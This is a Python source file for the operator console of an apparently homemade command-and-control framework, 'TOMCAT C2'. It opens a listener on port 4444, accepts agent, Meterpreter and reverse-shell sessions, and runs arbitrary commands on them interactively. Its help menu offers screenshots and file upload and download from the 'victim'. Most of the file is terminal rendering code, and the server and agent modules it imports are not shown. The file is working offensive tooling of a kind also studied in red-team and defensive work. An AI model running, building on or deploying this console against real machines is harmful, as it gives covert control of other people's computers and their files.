#!/usr/bin/python3
# TOMCAT C2 Frameworks
# Author: TOM7
# GitHub: tom7voldemort

"""
[+] NOTE:
    -- Copying without owner permission is illegal.
    -- If you want to expand this project, ask owner for collaboration instead.

    Thanks for understanding.
    ~TOM7
"""

import shutil
import threading
import time
from datetime import datetime
from Config.Color import TMColor
from Config.Logo import AUTHBanner, TBanner, EndBanner
from Cores.Systems.System import StrObject


class TOMCATC2CLI:
    def __init__(self):
        self.Server = None
        self.ServerStartTime = None
        self.Running = True
        self.Logs = []
        self.MaxLogs = 100
        self.CurrentSession = None
        self.MinWidth = 40
        self.Padding = 4

    def GetTermWidth(self):
        try:
            Width = shutil.get_terminal_size().columns
        except Exception:
            Width = 80
        return max(Width, self.MinWidth)

    def GetInnerWidth(self):
        return self.GetTermWidth() - self.Padding

    def RenderBox(self, Title):
        W = self.GetInnerWidth()
        Inner = W - 4
        TitleLen = len(Title)
        if TitleLen > Inner - 2:
            Title = Title[: Inner - 5] + "..."
            TitleLen = len(Title)
        PadLeft = (Inner - TitleLen) // 2
        PadRight = Inner - PadLeft - TitleLen
        Top = f"  {TMColor.red}┌{'─' * Inner}┐{TMColor.reset}"
        Mid = f"  {TMColor.red}│{' ' * PadLeft}{TMColor.white}{Title}{TMColor.red}{' ' * PadRight}│{TMColor.reset}"
        Bot = f"  {TMColor.red}└{'─' * Inner}┘{TMColor.reset}"
        return f"\n{Top}\n{Mid}\n{Bot}"

    def RenderCommandBox(self, Category, Commands):
        W = self.GetInnerWidth()
        ContentWidth = max(10, W - 6)
        BorderWidth = ContentWidth + 2
        CmdWidth = max(12, ContentWidth // 3)
        DescWidth = max(10, ContentWidth - CmdWidth)
        CatLabel = f"─ {Category} "
        DashTop = max(1, BorderWidth - len(CatLabel))
        Top = f"  {TMColor.red}┌{TMColor.red}{CatLabel}{TMColor.red}{'─' * DashTop}┐{TMColor.reset}"
        Bot = f"  {TMColor.red}└{'─' * BorderWidth}┘{TMColor.reset}"
        Result = [Top]
        for Cmd, Desc in Commands:
            CmdText = Cmd if len(Cmd) <= CmdWidth else Cmd[: CmdWidth - 2] + ".."
            DescText = Desc if len(Desc) <= DescWidth else Desc[: DescWidth - 2] + ".."
            Pad = max(0, ContentWidth - CmdWidth - len(DescText))
            Line = (
                f"  {TMColor.red}│ "
                f"{TMColor.green}{CmdText:<{CmdWidth}}"
                f"{TMColor.white}{DescText}"
                f"{' ' * Pad} "
                f"{TMColor.red}│{TMColor.reset}"
            )
            Result.append(Line)
        Result.append(Bot)
        return "\n".join(Result)

    def RenderOutputBox(self, Output):
        W = self.GetInnerWidth()
        ContentWidth = max(10, W - 6)
        BorderWidth = ContentWidth + 2
        Lines = []
        for RawLine in Output.splitlines():
            while len(RawLine) > ContentWidth:
                Lines.append(RawLine[:ContentWidth])
                RawLine = RawLine[ContentWidth:]
            Lines.append(RawLine)
        OutLabel = "─ Output "
        DashTop = max(1, BorderWidth - len(OutLabel))
        Top = f"  {TMColor.green}┌{OutLabel}{'─' * DashTop}┐{TMColor.reset}"
        Bot = f"  {TMColor.green}└{'─' * BorderWidth}┘{TMColor.reset}"
        Result = [Top]
        for Line in Lines:
            Pad = max(0, ContentWidth - len(Line))
            Result.append(
                f"  {TMColor.green}│ {TMColor.white}{Line}{' ' * Pad} {TMColor.green}│{TMColor.reset}"
            )
        Result.append(Bot)
        return "\n".join(Result)

    def RenderField(self, Label, Value, LabelColor=None, ValueColor=None):
        Lc = LabelColor or TMColor.red
        Vc = ValueColor or TMColor.white
        W = self.GetInnerWidth()
        LabelWidth = min(18, W // 4)
        return f"  {Lc}{Label:<{LabelWidth}}{TMColor.reset} {Vc}{Value}{TMColor.reset}"

    def RenderBullet(self, Symbol, Message, Color=None):
        C = Color or TMColor.white
        return f" {C}{Symbol} {Message}{TMColor.reset}"

    def RenderTag(self, Text, Color):
        return f"{Color}[{Text}]{TMColor.reset}"

    def RenderDivider(self):
        W = self.GetInnerWidth()
        return f"  {TMColor.red}{'─' * (W - 4)}{TMColor.reset}"

    def RenderTableRow(self, Columns, Widths, Color=None):
        C = Color or TMColor.white
        Row = "  "
        for i, Col in enumerate(Columns):
            Text = str(Col)
            MaxW = Widths[i]
            if len(Text) > MaxW:
                Text = Text[: MaxW - 2] + ".."
            Row += f"{C}{Text:<{MaxW}}{TMColor.reset}"
        return Row

    def CalcTableWidths(self, Headers, Ratios):
        Available = self.GetInnerWidth() - 4
        Widths = []
        for Ratio in Ratios:
            Widths.append(max(4, int(Available * Ratio)))
        Remainder = Available - sum(Widths)
        if Remainder > 0:
            Widths[-1] += Remainder
        return Widths

    def GetSessionById(self, SessionId):
        if hasattr(self.Server, "GetSession"):
            return self.Server.GetSession(SessionId)
        if hasattr(self.Server, "GetAgents"):
            for Session in self.Server.GetAgents():
                if Session["ID"] == SessionId:
                    return Session
        return None

    def GetTypeBadge(self, SessionType):
        Badges = {
            "TOMCAT": self.RenderTag("TOMCAT", TMColor.red),
            "METERPRETER": self.RenderTag("METERPRETER", TMColor.magenta),
            "REVERSE_SHELL": self.RenderTag("SHELL", TMColor.white),
        }
        return Badges.get(SessionType, self.RenderTag("UNKNOWN", TMColor.red))

    def FetchSessions(self):
        if not self.Server:
            return None
        if hasattr(self.Server, "GetSessions"):
            return self.Server.GetSessions()
        if hasattr(self.Server, "GetAgents"):
            return self.Server.GetAgents()
        return None

    def AddLog(self, Message, PrintNow=False):
        Timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        LogEntry = f"  {TMColor.red}[{Timestamp}]{TMColor.reset} {Message}"
        self.Logs.append(LogEntry)
        if len(self.Logs) > self.MaxLogs:
            self.Logs.pop(0)
        if PrintNow:
            print(LogEntry)

    def PrintBanner(self):
        StrObject.Clear()
        TBanner.Logo()

    def Helper(self):
        StrObject.Clear()
        TBanner.Logo()
        AUTHBanner.Logo()
        print(self.RenderBox("COMMAND REFERENCE"))
        print()
        print(
            self.RenderCommandBox(
                "SERVER",
                [
                    ("help", "Show this help menu"),
                    ("status", "Display server status and uptime"),
                    ("stats", "Session statistics breakdown"),
                    ("logs", "View recent event logs"),
                    ("clear", "Clear terminal screen"),
                    ("exit", "Stop server and exit"),
                    ("sessions", "List all active sessions"),
                    ("use <id>", "Enter interactive session mode"),
                    ("exec <id> <cmd>", "Execute single command on session"),
                    ("kill <id>", "Terminate a session"),
                ],
            )
        )
        print()
        print(
            self.RenderCommandBox(
                "SESSION",
                [
                    ("sysinfo", "Show agent info"),
                    ("screenshot", "Take screenshot from victim"),
                    ("upload <path/to/file>", "Upload any file to victim"),
                    ("download <path/to/file>", "Download any file from victim"),
                    ("elevate", "Check privileges level of agent process"),
                ],
            )
        )
        print()

    def ServerEventHandler(self, EventType, Data):
        if EventType == "ServerStarted":
            self.AddLog(
                f"{TMColor.white}✔  Server listening on {Data['Host']}:{Data['Port']}{TMColor.reset}"
            )
            if "Mode" in Data and Data["Mode"]:
                self.AddLog(f"{TMColor.white}⚙ Mode: {Data['Mode']}{TMColor.reset}")
            if "Key" in Data and Data["Key"] != "N/A":
                self.AddLog(
                    f"{TMColor.white}🔑 Key: {Data['Key'][:32]}...{TMColor.reset}"
                )
        elif EventType == "AgentConnected":
            Badge = self.GetTypeBadge(Data.get("Type", "UNKNOWN"))
            self.AddLog(
                f"{TMColor.green}★  {Badge} SESSION-{Data['ID']}: {Data['AgentName']} ({Data['OS']}){TMColor.reset}"
            )
            self.AddLog(
                f"{TMColor.red}↳  IP: {TMColor.white}{Data['AgentIP']}\n                           {TMColor.red}User: {TMColor.white}{Data['User']}\n                           {TMColor.red}Host: {TMColor.white}{Data['Hostname']}{TMColor.reset}"
            )
        elif EventType == "AgentDisconnected":
            self.AddLog(
                f"{TMColor.red}✖ SESSION-{Data['ID']} disconnected: {Data.get('Reason', 'Unknown')}{TMColor.reset}"
            )
        elif EventType == "AgentRemoved":
            self.AddLog(f"{TMColor.white}⊘ SESSION-{Data['ID']} removed{TMColor.reset}")
        elif EventType == "Error":
            self.AddLog(f"{TMColor.red}✘ Error: {Data['Message']}{TMColor.reset}")

    def StartServer(
        self, Host="0.0.0.0", Port=4444, UseMTLS=False, MeterpreterMode=False
    ):
        try:
            if MeterpreterMode:
                from Cores.Systems.MultiProtocolServer import (
                    MultiProtocolServer as TOMCATC2SERVER,
                )

                self.Server = TOMCATC2SERVER(
                    Host=Host,
                    Port=Port,
                    UseMTLS=UseMTLS,
                    MeterpreterMode=MeterpreterMode,
                )
            else:
                from Cores.Systems.Server import TOMCATC2SERVER

                self.Server = TOMCATC2SERVER(Host=Host, Port=Port, UseMTLS=UseMTLS)
            self.Server.AddEventListener(self.ServerEventHandler)
            Success, Message = self.Server.StartServer()
            if not Success:
                self.AddLog(f"{TMColor.red}✘ Failed to start: {Message}{TMColor.reset}")
                return False
            self.ServerStartTime = time.time()
            AcceptThread = threading.Thread(
                target=self.Server.AcceptConnections, daemon=True
            )
            AcceptThread.start()
            self.Server.AcceptThread = AcceptThread
            return True
        except Exception as Error:
            self.AddLog(f"{TMColor.red}✘ Exception: {Error}{TMColor.reset}")
            return False

    def ShowSessions(self):
        if not self.Server:
            print(self.RenderBullet("✘", "Server not running", TMColor.red))
            return
        Sessions = self.FetchSessions()
        if Sessions is None:
            print(
                self.RenderBullet(
                    "✘", "Server does not support session listing", TMColor.red
                )
            )
            return
        if not Sessions:
            print(self.RenderBullet("⚠", "No active sessions", TMColor.white))
            return
        print(self.RenderBox("ACTIVE SESSIONS"))
        print()
        Headers = ["ID", "TYPE", "AGENT", "IP", "OS", "USER", "HOST"]
        Ratios = [0.06, 0.15, 0.15, 0.20, 0.14, 0.15, 0.15]
        Widths = self.CalcTableWidths(Headers, Ratios)
        print(self.RenderTableRow(Headers, Widths, TMColor.red))
        print(self.RenderDivider())
        for S in Sessions:
            Row = [
                S["ID"],
                S.get("Type", "TOMCAT"),
                S["AgentName"],
                S["AgentIP"],
                S["OS"],
                S["User"],
                S["Hostname"],
            ]
            print(self.RenderTableRow(Row, Widths, TMColor.white))
        print()

    def ShowStatus(self):
        if not self.Server or not self.Server.Running:
            print(self.RenderBullet("✘", "Server not running", TMColor.red))
            return
        Uptime = int(time.time() - self.ServerStartTime) if self.ServerStartTime else 0
        Hours = Uptime // 3600
        Minutes = (Uptime % 3600) // 60
        Seconds = Uptime % 60
        Sessions = self.FetchSessions()
        Count = len(Sessions) if Sessions else 0
        print(self.RenderBox("SERVER STATUS"))
        print()
        print(self.RenderField("Status", f"{TMColor.green}● ONLINE{TMColor.reset}"))
        print(self.RenderField("Uptime", f"{Hours:02d}h {Minutes:02d}m {Seconds:02d}s"))
        print(self.RenderField("Sessions", str(Count)))
        if hasattr(self.Server, "MeterpreterMode") and self.Server.MeterpreterMode:
            print(self.RenderField("Mode", "Multi-Protocol / Meterpreter"))
        if hasattr(self.Server, "UseMTLS") and self.Server.UseMTLS:
            print(
                self.RenderField(
                    "Security", f"{TMColor.green}mTLS Enabled{TMColor.reset}"
                )
            )
        print()

    def ShowStats(self):
        if not self.Server:
            print(self.RenderBullet("✘", "Server not running", TMColor.red))
            return
        print(self.RenderBox("SESSION STATISTICS"))
        print()
        if hasattr(self.Server, "GetSessionStats"):
            Stats = self.Server.GetSessionStats()
            print(self.RenderField("Server Key", str(Stats["ServerKey"])))
            print(self.RenderField("Server Address", str(Stats["ServerAddress"])))
            print(self.RenderField("Server Port", str(Stats["ServerPort"])))
            print(self.RenderField("Total Sessions", str(Stats["Total"])))
            print(self.RenderField("TOMCAT Agents", str(Stats["TOMCAT"]), TMColor.red))
            print(
                self.RenderField(
                    "Meterpreter", str(Stats["Meterpreter"]), TMColor.magenta
                )
            )
            print(
                self.RenderField(
                    "Reverse Shells", str(Stats["ReverseShell"]), TMColor.white
                )
            )
        else:
            Sessions = self.FetchSessions()
            Total = len(Sessions) if Sessions else 0
            print(self.RenderField("Total Sessions", str(Total)))
            if hasattr(self.Server, "GetSessionStat"):
                Stats = self.Server.GetSessionStat()
            print(self.RenderField("Server Address", str(Stats["ServerAddress"])))
            print(self.RenderField("Server Port", str(Stats["ServerPort"])))
        print()

    def ShowLogs(self):
        print(self.RenderBox("RECENT LOGS"))
        print()
        if not self.Logs:
            print(self.RenderBullet("⚠", "No logs available", TMColor.white))
            print()
            return
        for Log in self.Logs[-20:]:
            print(Log)
        print()

    def ExecuteCommand(self, SessionId, Command):
        if not self.Server:
            print(self.RenderBullet("✘", "Server not running", TMColor.red))
            return
        Success, Output = self.Server.ExecuteCommand(SessionId, Command)
        if Success:
            print(self.RenderOutputBox(Output))
            Preview = Output[:100].replace("\n", " ") + (
                "..." if len(Output) > 100 else ""
            )
            self.AddLog(
                f"{TMColor.green}◀ SESSION-{SessionId} OK: {Preview}{TMColor.reset}"
            )
        else:
            print(self.RenderBullet("✘", f"Error: {Output}", TMColor.red))
            self.AddLog(
                f"{TMColor.red}✘ SESSION-{SessionId} FAIL: {Output}{TMColor.reset}"
            )

    def RenderSessionHeader(self, SessionId, Session):
        StrObject.Clear()
        TBanner.Logo()
        Badge = self.GetTypeBadge(Session.get("Type", "UNKNOWN"))
        print(self.RenderBox("INTERACTIVE SESSION"))
        print()
        print(f"  {TMColor.red}SESSION-{SessionId}{TMColor.reset}  {Badge}")
        print(self.RenderField("Agent :", f"{Session['AgentName']} ({Session['OS']})"))
        print(self.RenderField("IP Address :", Session["AgentIP"]))
        print()
        print(
            self.RenderBullet(
                "→", "Type 'back' to return to main console", TMColor.white
            )
        )
        print(self.RenderDivider())

    def InteractiveSession(self, SessionId):
        Session = self.GetSessionById(SessionId)
        if not Session:
            print(self.RenderBullet("✘", "Session not found", TMColor.red))
            return
        self.RenderSessionHeader(SessionId, Session)
        self.AddLog(
            f"{TMColor.red}↳ Entered interactive mode: SESSION-{SessionId}{TMColor.reset}"
        )
        self.CurrentSession = SessionId
        while self.CurrentSession == SessionId:
            try:
                Prompt = f"\n{TMColor.red}({TMColor.white}SESSION-{SessionId}{TMColor.red}){TMColor.white} ≫ {TMColor.reset}"
                Command = input(Prompt).strip()
                if not Command:
                    continue
                if Command.lower() == "back":
                    self.CurrentSession = None
                    print(
                        self.RenderBullet("◀", "Returned to main console", TMColor.red)
                    )
                    self.AddLog(
                        f"{TMColor.red}◀ Exited interactive: SESSION-{SessionId}{TMColor.reset}"
                    )
                    break
                if Command.lower() == "clear":
                    Session = self.GetSessionById(SessionId)
                    if Session:
                        self.RenderSessionHeader(SessionId, Session)
                    continue
                self.AddLog(
                    f"{TMColor.red}▶ SESSION-{SessionId} interactive: {Command}{TMColor.reset}"
                )
                Success, Output = self.Server.ExecuteCommand(SessionId, Command)
                if Success:
                    print(self.RenderOutputBox(Output))
                    Preview = Output[:100].replace("\n", " ") + (
                        "..." if len(Output) > 100 else ""
                    )
                    self.AddLog(
                        f"{TMColor.green}◀ SESSION-{SessionId} OK: {Preview}{TMColor.reset}"
                    )
                else:
                    print(self.RenderBullet("✘", f"Error: {Output}", TMColor.red))
                    self.AddLog(
                        f"{TMColor.red}✘ SESSION-{SessionId} FAIL: {Output}{TMColor.reset}"
                    )
                    if "not found" in Output.lower():
                        self.CurrentSession = None
                        break
            except KeyboardInterrupt:
                print(
                    self.RenderBullet(
                        "⚠", "Use 'back' to exit interactive mode", TMColor.white
                    )
                )
            except EOFError:
                self.CurrentSession = None
                self.AddLog(
                    f"{TMColor.red}◀ EOF exit: SESSION-{SessionId}{TMColor.reset}"
                )
                break

    def KillSession(self, SessionId):
        if not self.Server:
            print(self.RenderBullet("✘", "Server not running", TMColor.red))
            return
        Session = self.GetSessionById(SessionId)
        if not Session:
            print(self.RenderBullet("✘", "Session not found", TMColor.red))
            return
        AgentName = Session["AgentName"]
        self.AddLog(
            f"{TMColor.white}⊘ Killing SESSION-{SessionId} ({AgentName})...{TMColor.reset}",
            PrintNow=True,
        )
        if hasattr(self.Server, "RemoveSession"):
            self.Server.RemoveSession(SessionId)
        elif hasattr(self.Server, "RemoveAgent"):
            self.Server.RemoveAgent(SessionId)
        else:
            print(
                self.RenderBullet(
                    "✘", "Server does not support session removal", TMColor.red
                )
            )
            return
        print(
            self.RenderBullet(
                "✔", f"SESSION-{SessionId} ({AgentName}) terminated", TMColor.green
            )
        )
        self.AddLog(
            f"{TMColor.green}✔ SESSION-{SessionId} ({AgentName}) killed{TMColor.reset}"
        )

    def RunCLI(self):
        self.Helper()
        LastLogCount = len(self.Logs)
        while self.Running:
            try:
                if len(self.Logs) > LastLogCount and self.CurrentSession is None:
                    NewCount = len(self.Logs) - LastLogCount
                    print(
                        self.RenderBullet(
                            "●",
                            f"{NewCount} New events — type 'logs' to view",
                            TMColor.white,
                        )
                    )
                    LastLogCount = len(self.Logs)
                Prompt = f"\n{TMColor.red}┌──({TMColor.white}TOMCAT@C2{TMColor.red})\n└─{TMColor.white}≫ {TMColor.reset}"
                Command = input(Prompt).strip()
                if not Command:
                    continue
                Parts = Command.split(maxsplit=2)
                Cmd = Parts[0].lower()
                if Cmd == "exit":
                    print(self.RenderBullet("⏻", "Shutting Down Server", TMColor.white))
                    if self.Server:
                        self.Server.StopServer()
                    self.Running = False
                    break
                elif Cmd == "help":
                    self.Helper()
                elif Cmd == "clear":
                    self.PrintBanner()
                    LastLogCount = len(self.Logs)
                elif Cmd == "sessions":
                    self.ShowSessions()
                elif Cmd == "status":
                    self.ShowStatus()
                elif Cmd == "stats":
                    self.ShowStats()
                elif Cmd == "logs":
                    self.ShowLogs()
                    LastLogCount = len(self.Logs)
                elif Cmd == "use":
                    if len(Parts) < 2:
                        print(
                            self.RenderBullet(
                                "⚠", "Usage: use <session id>", TMColor.red
                            )
                        )
                    else:
                        try:
                            SessionId = int(Parts[1])
                            self.InteractiveSession(SessionId)
                            LastLogCount = len(self.Logs)
                        except ValueError:
                            print(
                                self.RenderBullet(
                                    "✘", "Invalid Session ID", TMColor.red
                                )
                            )
                elif Cmd == "exec":
                    if len(Parts) < 3:
                        print(
                            self.RenderBullet(
                                "⚠", "Usage: exec <session id> <command>", TMColor.red
                            )
                        )
                    else:
                        try:
                            SessionId = int(Parts[1])
                            ExecCmd = Parts[2]
                            self.ExecuteCommand(SessionId, ExecCmd)
                        except ValueError:
                            print(
                                self.RenderBullet(
                                    "✘", "Invalid Session ID", TMColor.red
                                )
                            )
                elif Cmd == "kill":
                    if len(Parts) < 2:
                        print(
                            self.RenderBullet(
                                "⚠", "Usage: kill <session id>", TMColor.red
                            )
                        )
                    else:
                        try:
                            SessionId = int(Parts[1])
                            self.KillSession(SessionId)
                        except ValueError:
                            print(
                                self.RenderBullet(
                                    "✘", "Invalid Session ID", TMColor.red
                                )
                            )
                else:
                    print(
                        self.RenderBullet("✘", f"Unknown Command: {Cmd}", TMColor.red)
                    )
                    print(
                        self.RenderBullet(
                            "→", "Type 'help' For Available Commands", TMColor.white
                        )
                    )
            except KeyboardInterrupt:
                print(self.RenderBullet("⚠", "Use 'exit' To Quit", TMColor.white))
            except EOFError:
                print(self.RenderBullet("⏻", "Shutting Down Server", TMColor.white))
                if self.Server:
                    self.Server.StopServer()
                break
        EndBanner.EndLogo()

    def Run(self, Host="0.0.0.0", Port=4444, UseMTLS=False, MeterpreterMode=False):
        if not self.StartServer(Host, Port, UseMTLS, MeterpreterMode):
            return
        time.sleep(0.5)
        self.RunCLI()
